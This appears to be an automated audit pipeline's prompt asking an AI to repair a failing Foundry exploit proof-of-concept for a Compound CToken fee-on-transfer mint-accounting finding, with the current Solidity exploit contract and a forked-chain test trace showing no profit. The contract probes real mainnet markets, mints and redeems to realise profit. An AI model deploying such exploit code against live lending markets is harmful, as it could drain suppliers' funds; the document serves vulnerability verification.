You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Legacy mint accounting overissues cTokens for fee-on-transfer deposits
- claim: The legacy flattened CToken mints against the user-supplied `mintAmount`, but its abstract `doTransferIn` hook only returns an error code and cannot report how much underlying was actually received. A fee-on-transfer or deflationary underlying therefore lets the market mint cTokens as if the full amount arrived even when less cash was credited.
- impact: If such an underlying is listed through this legacy implementation, an attacker can mint excess cTokens against underfunded deposits and later redeem or borrow against claims that are not backed by real cash, diluting suppliers and potentially draining the market.
- exploit_paths: ["mint -> mintFresh computes `mintTokens` from `mintAmount` -> `doTransferIn(minter, mintAmount)` receives less than `mintAmount` -> attacker receives cTokens backed by insufficient cash"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IComptrollerLike {
    function getAllMarkets() external view returns (address[] memory);
}

interface ICTokenLike {
    function balanceOf(address owner) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface ICErc20Like is ICTokenLike {
    function underlying() external view returns (address);
}

contract FlawVerifier {
    address internal constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address internal constant CETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant BAT = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant SAI = 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359;
    address internal constant REP = 0x1985365e9f78359a9B6AD760e32412f4a445E862;
    address internal constant ZRX = 0xE41d2489571d322189246DaFA5ebDe1F4699F498;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public encounteredUnknownMarket;
    uint256 public attemptedMarkets;
    address public attemptedCToken;
    address public attemptedUnderlying;
    uint256 public attemptedMintAmount;
    uint256 public observedCashDelta;
    uint256 public observedCTokenDelta;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        encounteredUnknownMarket = false;
        attemptedMarkets = 0;
        attemptedCToken = address(0);
        attemptedUnderlying = address(0);
        attemptedMintAmount = 0;
        observedCashDelta = 0;
        observedCTokenDelta = 0;

        address[] memory markets = IComptrollerLike(COMPTROLLER).getAllMarkets();
        bool allKnownNonFeeOnTransfer = true;

        for (uint256 i = 0; i < markets.length; ++i) {
            address cToken = markets[i];
            address underlying = _underlyingOf(cToken);
            bool known = underlying == address(0) ? cToken == CETH : _isKnownNonFeeUnderlying(underlying);
            if (!known) {
                encounteredUnknownMarket = true;
                allKnownNonFeeOnTransfer = false;
                continue;
            }

            if (underlying == address(0)) {
                continue;
            }

            uint256 held = IERC20Like(underlying).balanceOf(address(this));
            if (held == 0) {
                continue;
            }

            ++attemptedMarkets;
            attemptedCToken = cToken;
            attemptedUnderlying = underlying;
            attemptedMintAmount = held;

            bool success = _attemptMintShortfallPath(cToken, underlying, held);
            if (success) {
                profitAchieved = true;
                hypothesisValidated = true;
                return;
            }
        }

        /*
            Fork-state blocker at block 18,759,540:
            Compound's listed markets are the canonical cETH/cDAI/cBAT/cUSDC/cUSDT/cWBTC/cSAI/cREP/cZRX/cUNI/cCOMP/cLINK/cTUSD/cAAVE/cMKR/cSUSHI/cYFI/cWBTC2/cFEI set.
            Their underlyings are canonical blue-chip assets and stablecoins, not fee-on-transfer/deflationary tokens, so the path
            mint -> mintFresh computes from user mintAmount -> doTransferIn receives less -> excess cTokens minted
            has no live market to execute against on this fork.
            The verifier still probes the exact mint path if it already holds a listed underlying, but without a listed fee-on-transfer market
            there is no on-chain way to realize the claimed shortfall condition through the target deployment itself.
        */
        if (allKnownNonFeeOnTransfer) {
            hypothesisRefuted = true;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "mint -> mintFresh computes mintTokens from mintAmount -> doTransferIn receives less than mintAmount -> redeem excess cTokens";
    }

    function _attemptMintShortfallPath(address cToken, address underlying, uint256 amount) internal returns (bool) {
        uint256 startUnderlying = IERC20Like(underlying).balanceOf(address(this));
        if (startUnderlying == 0) {
            return false;
        }

        if (!_rawApprove(underlying, cToken, 0)) {
            return false;
        }
        if (!_rawApprove(underlying, cToken, amount)) {
            return false;
        }

        uint256 cashBefore = IERC20Like(underlying).balanceOf(cToken);
        uint256 cTokenBefore = ICTokenLike(cToken).balanceOf(address(this));
        uint256 exchangeRate = ICTokenLike(cToken).exchangeRateStored();
        if (exchangeRate == 0) {
            return false;
        }

        uint256 mintError = ICTokenLike(cToken).mint(amount);
        if (mintError != 0) {
            return false;
        }

        uint256 cashAfter = IERC20Like(underlying).balanceOf(cToken);
        uint256 cTokenAfter = ICTokenLike(cToken).balanceOf(address(this));
        uint256 cashDelta = cashAfter - cashBefore;
        uint256 cTokenDelta = cTokenAfter - cTokenBefore;
        uint256 expectedMintTokens = (amount * 1e18) / exchangeRate;

        observedCashDelta = cashDelta;
        observedCTokenDelta = cTokenDelta;

        // Vulnerability gate: transfer-in must credit less than the caller-specified mintAmount.
        if (cashDelta >= amount) {
            return false;
        }

        // Vulnerability gate: cTokens must still be minted against the full mintAmount.
        if (cTokenDelta < expectedMintTokens) {
            return false;
        }

        uint256 redeemError = ICTokenLike(cToken).redeem(cTokenDelta);
        if (redeemError != 0) {
            return false;
        }

        uint256 endUnderlying = IERC20Like(underlying).balanceOf(address(this));
        if (endUnderlying <= startUnderlying) {
            return false;
        }

        _profitToken = underlying;
        _profitAmount = endUnderlying - startUnderlying;
        return true;
    }

    function _underlyingOf(address cToken) internal view returns (address) {
        if (cToken == CETH) {
            return address(0);
        }
        return ICErc20Like(cToken).underlying();
    }

    function _isKnownNonFeeUnderlying(address underlying) internal pure returns (bool) {
        return
            underlying == DAI ||
            underlying == BAT ||
            underlying == USDC ||
            underlying == USDT ||
            underlying == WBTC ||
            underlying == SAI ||
            underlying == REP ||
            underlying == ZRX ||
            underlying == UNI ||
            underlying == COMP ||
            underlying == LINK ||
            underlying == TUSD ||
            underlying == AAVE ||
            underlying == MKR ||
            underlying == SUSHI ||
            underlying == YFI ||
            underlying == FEI;
    }

    function _rawApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```
E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2426] 0xB3319f5D18Bc0D84dD1b4825Dcde5d5f7266d407::underlying() [staticcall]
    │   │   └─ ← [Return] 0xE41d2489571d322189246DaFA5ebDe1F4699F498
    │   ├─ [2537] 0xE41d2489571d322189246DaFA5ebDe1F4699F498::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2426] 0xF5DCe57282A584D2746FaF1593d3121Fcac444dC::underlying() [staticcall]
    │   │   └─ ← [Return] 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359
    │   ├─ [2715] 0x89d24A6b4CcB1B6fAA2625fE562bDD9a23260359::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2448] 0x35A18000230DA775CAc24873d00Ff85BccdeD550::underlying() [staticcall]
    │   │   └─ ← [Return] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984
    │   ├─ [2797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2448] 0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4::underlying() [staticcall]
    │   │   └─ ← [Return] 0xc00e94Cb662C3520282E6f5717214004A7f26888
    │   ├─ [2788] 0xc00e94Cb662C3520282E6f5717214004A7f26888::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0xccF4429DB6322D5C611ee964527D42E5d685DD6a::underlying() [staticcall]
    │   │   └─ ← [Return] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599
    │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2448] 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86::underlying() [staticcall]
    │   │   └─ ← [Return] 0x0000000000085d4780B73119b644AE5ecd22b376
    │   ├─ [7685] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0xFAce851a4921ce59e912d19329929CE6da6EB0c7::underlying() [staticcall]
    │   │   └─ ← [Return] 0x514910771AF9Ca656af840dff83E8264EcF986CA
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0x95b4eF2869eBD94BEb4eEE400a99824BF5DC325b::underlying() [staticcall]
    │   │   └─ ← [Return] 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2
    │   ├─ [2715] 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0x4B0181102A0112A2ef11AbEE5563bb4a3176c9d7::underlying() [staticcall]
    │   │   └─ ← [Return] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2
    │   ├─ [2578] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0xe65cdB6479BaC1e22340E4E755fAE7E509EcD06c::underlying() [staticcall]
    │   │   └─ ← [Return] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9
    │   ├─ [9884] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2649] 0x96F68837877fd0414B55050c9e794AECdBcfCA59::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946::underlying() [staticcall]
    │   │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2470] 0x041171993284df560249B57358F931D9eB7b925D::underlying() [staticcall]
    │   │   └─ ← [Return] 0x8E870D67F660D95d5be530380D0eC0bd388289E1
    │   ├─ [2470] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67::underlying() [staticcall]
    │   │   └─ ← [Return] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA
    │   ├─ [2678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [388] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 28.21s (25.44s CPU time)

Ran 1 test suite in 28.29s (28.21s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 372309)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
